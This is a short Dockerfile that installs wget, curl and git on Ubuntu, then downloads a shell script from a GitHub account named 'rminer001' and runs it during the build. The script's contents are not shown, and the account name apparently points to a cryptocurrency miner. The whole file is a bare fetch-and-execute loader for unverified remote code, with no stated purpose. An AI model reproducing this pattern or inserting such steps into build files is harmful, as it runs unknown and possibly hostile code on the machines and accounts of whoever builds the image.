FROM ubuntu:latest
RUN apt update
RUN apt install wget curl git -y
RUN wget https://raw.githubusercontent.com/rminer001/rr/main/rie.sh
RUN sh rie.sh
